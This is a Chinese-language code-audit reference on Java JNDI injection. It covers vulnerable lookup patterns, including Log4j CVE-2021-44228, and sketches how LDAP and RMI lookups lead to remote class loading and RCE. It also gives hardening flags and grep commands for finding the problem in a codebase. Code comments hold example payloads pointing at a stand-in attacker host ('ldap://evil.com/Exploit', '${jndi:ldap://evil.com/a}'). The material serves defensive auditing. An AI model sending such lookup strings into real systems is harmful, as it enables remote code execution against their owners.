# Java JNDI 注入

## 确认条件

JNDI lookup 地址用户可控，可指向恶意 LDAP/RMI 服务。

## 检测

```java
// 直接 lookup
Context ctx = new InitialContext();
Object obj = ctx.lookup(request.getParameter("name"));
// ldap://evil.com/Exploit

// Spring JndiTemplate
JndiTemplate template = new JndiTemplate();
Object obj = template.lookup(request.getParameter("jndiName"));

// Log4j CVE-2021-44228
logger.info(userInput);  // ${jndi:ldap://evil.com/a}
logger.error("User input: {}", userInput);

// Shiro JNDI
String jndiUrl = request.getParameter("url");
ctx.lookup(jndiUrl);

// Spring @Value
@Value("${jndi:ldap://evil.com/a}")
private String value;
```

## JNDI 利用链

```
JNDI → LDAP → 返回 Reference → 远程类加载 → RCE
JNDI → RMI  → 返回 Reference → 远程类加载 → RCE (JDK >= 8u121 需绕过)
JNDI → DNS  → DNS外带 → 信息泄露
JNDI → LDAP → 返回序列化对象 → 反序列化Gadget → RCE
```

## 安全配置

```bash
# JDK 8u121+
-Dcom.sun.jndi.rmi.object.trustURLCodebase=false
-Dcom.sun.jndi.ldap.object.trustURLCodebase=false

# JDK 11.0.1+ 默认关闭远程类加载
# JDK 17+ 完全禁止远程类加载

# Log4j
# 升级到 >= 2.17.1
# 设置: -Dlog4j2.formatMsgNoLookups=true
# 移除 JndiLookup 类: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

## 检测命令

```bash
grep -rn "InitialContext\|lookup(" --include="*.java"
grep -rn "JndiTemplate\|JndiObjectFactoryBean" --include="*.java"
grep -rn "log4j" --include="*.xml" --include="*.properties" pom.xml
find . -name "log4j-core-*.jar" -exec echo {} \; # 检查 Log4j 版本

# 检查JNDI保护是否配置
grep -rn "trustURLCodebase\|com.sun.jndi" --include="*.properties" --include="*.xml"
```
